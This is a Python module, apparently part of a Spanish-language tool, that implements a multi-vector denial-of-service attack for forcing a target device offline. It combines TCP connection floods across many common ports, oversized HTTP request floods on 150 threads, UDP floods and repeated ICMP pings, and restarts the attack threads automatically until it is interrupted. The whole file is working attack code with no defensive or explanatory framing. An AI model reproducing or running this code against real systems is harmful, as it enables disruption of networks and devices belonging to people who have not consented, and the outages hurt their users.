#!/usr/bin/env python3
# attack_modules.py
import time
import socket
import threading
import subprocess





def connection_flood(target_ip, stop_event):
    """Flood de conexiones TCP para saturar el dispositivo objetivo"""
    # Puertos comunes para atacar
    common_ports = [21, 22, 23, 25, 53, 80, 135, 139, 443, 445, 993, 995, 1433, 3389, 5900, 8080, 8443, 9090]

    def flood_port(port):
        """ Función para hacer flood a un puerto específico """
        while not stop_event.is_set():
            connections = []
            try:
                while len(connections) < 100 and not stop_event.is_set():  # Limitar conexiones por puerto
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(0.5)
                        sock.connect((target_ip, port))
                        connections.append(sock)

                        # Enviar datos específicos según el puerto
                        if port in [80, 8080, 8443]:
                            # Solicitud HTTP que consume recursos
                            request = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\nUser-Agent: Mozilla/5.0\r\nConnection: keep-alive\r\n\r\n"
                            sock.send(request.encode())
                        elif port == 443:
                            # Solicitud HTTPS básica
                            request = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\nConnection: keep-alive\r\n\r\n"
                            sock.send(request.encode())
                        elif port == 22:
                            # Banner SSH
                            sock.send(b"SSH-2.0-OpenSSH_8.0\r\n")
                        else:
                            # Datos genéricos
                            sock.send(b"A" * 512)
                            
                        time.sleep(0.05)  # Pequeño delay para no saturar demasiado rápido
                    except:
                        break
            except Exception as e:
                pass
            finally:
                # Cerrar conexiones
                for sock in connections:
                    try:
                        sock.close()
                    except:
                        pass
                time.sleep(1)  # Delay antes de reiniciar el ciclo

    print(f"[+] Iniciando flood de conexiones TCP contra {target_ip}")
    print(f"[*] Puertos objetivo: {common_ports}")

    # Crear threads para cada puerto
    threads = []
    for port in common_ports:
        thread = threading.Thread(target=flood_port, args=(port,))
        thread.daemon = True
        threads.append(thread)
        thread.start()
    return threads



def bandwidth_saturation(target_ip, stop_event):
    """ Intenta saturar el ancho de banda del dispositivo objetivo """
    def flood_worker():
        """ Worker que envía datos continuamente para saturar ancho de banda """
        while not stop_event.is_set():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                sock.connect((target_ip, 80))

                # Crear solicitud HTTP grande para consumir ancho de banda
                large_request = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\n"
                large_request += "User-Agent: " + "X" * 2000 + "\r\n"
                large_request += "Accept: " + "*/*," * 200 + "\r\n"
                large_request += "Cookie: " + "session=" + "Y" * 1000 + "\r\n"
                large_request += "Connection: close\r\n\r\n"

                sock.send(large_request.encode())
                try:
                    sock.recv(4096)  # Intentar recibir respuesta
                except:
                    pass
                sock.close()
                time.sleep(0.01)  # Pequeño delay
            except:
                if not stop_event.is_set():
                    time.sleep(0.1)  # Delay mayor si falla

    print(f"[+] Iniciando saturación de ancho de banda contra {target_ip}")

    # Crear múltiples threads para saturar el ancho de banda
    threads = []
    for i in range(150):  # 150 threads concurrentes
        thread = threading.Thread(target=flood_worker)
        thread.daemon = True
        threads.append(thread)
        thread.start()
    return threads



def udp_flood(target_ip, stop_event):
    """ Flood UDP para saturar el dispositivo con paquetes UDP """
    def udp_worker():
        """ Worker que envía paquetes UDP continuamente """
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            data = b"X" * 1024  # Paquete de 1KB

            # Puertos UDP comunes
            common_udp_ports = [53, 67, 68, 123, 161, 162, 500, 1900, 5353, 5355, 137, 138, 69, 514, 520]

            while not stop_event.is_set():
                # Enviar paquetes a todos los puertos UDP
                for port in common_udp_ports:
                    if stop_event.is_set():
                        break
                    try:
                        sock.sendto(data, (target_ip, port))
                    except:
                        pass
                time.sleep(0.005)  # Pequeño delay entre envíos
        except:
            pass
        finally:
            try:
                sock.close()
            except:
                pass

    print(f"[+] Iniciando flood UDP contra {target_ip}")

    # Crear múltiples threads para UDP flood
    threads = []
    for i in range(75):  # 75 threads UDP
        thread = threading.Thread(target=udp_worker)
        thread.daemon = True
        threads.append(thread)
        thread.start()
    return threads



def icmp_flood(target_ip, stop_event):
    """ Flood ICMP usando ping para saturar el dispositivo """
    def icmp_worker():
        """ Worker que envía paquetes ICMP continuamente """
        while not stop_event.is_set():
            try:
                # Usar ping flood (requiere permisos especiales para -f)
                # Usar ping normal con tamaño grande
                subprocess.run(
                    ["ping", "-c", "1", "-s", "1400", target_ip],
                    capture_output=True, timeout=1
                )
            except:
                pass
            time.sleep(0.01)

    print(f"[+] Iniciando flood ICMP contra {target_ip}")

    # Crear múltiples threads para ICMP flood
    threads = []
    for i in range(50):  # 50 threads ICMP
        thread = threading.Thread(target=icmp_worker)
        thread.daemon = True
        threads.append(thread)
        thread.start()
    return threads



def kick_device(target_ip):
    """ Ejecuta múltiples tipos de ataque para desconectar el dispositivo """
    print(f"[+] Ejecutando ataque multi-vector contra {target_ip}")
    print(f"[*] Ataques incluidos: TCP flood, UDP flood, Bandwidth saturation, ICMP flood")
    print(f"[*] Presiona Ctrl+C para detener el ataque")

    # Crear evento para detener todos los ataques
    stop_event = threading.Event()
    
    try:
        # Ejecutar ataques en paralelo para máxima efectividad
        tcp_threads = connection_flood(target_ip, stop_event)
        udp_threads = udp_flood(target_ip, stop_event)
        bandwidth_threads = bandwidth_saturation(target_ip, stop_event)
        icmp_threads = icmp_flood(target_ip, stop_event)
        
        # Combinar todos los threads
        all_threads = tcp_threads + udp_threads + bandwidth_threads + icmp_threads
        
        # Mantener el ataque activo hasta que el usuario lo detenga
        print(f"[*] Ataque activo contra {target_ip}...")
        while True:
            time.sleep(1)
            # Verificar que los threads sigan vivos
            active_threads = [t for t in all_threads if t.is_alive()]
            if not active_threads:
                print(f"[*] Reiniciando threads de ataque...")
                # Reiniciar ataques si todos los threads murieron
                tcp_threads = connection_flood(target_ip, stop_event)
                udp_threads = udp_flood(target_ip, stop_event)
                bandwidth_threads = bandwidth_saturation(target_ip, stop_event)
                icmp_threads = icmp_flood(target_ip, stop_event)
                all_threads = tcp_threads + udp_threads + bandwidth_threads + icmp_threads
    except Exception as error_log:
        print('\n\n')
        print("[ ATAQUE DETENIDO, debido a un error ]")
        print(error_log)
        
        print('\n')
        print(f"[!] Deteniendo ataque contra {target_ip}...")
        stop_event.set()
        
        # Esperar a que terminen todos los threads
        for thread in all_threads:
            thread.join(timeout=1)
            
        print(f"[+] Ataque detenido contra {target_ip}")
        raise  # Re-raise para que main() pueda manejarlo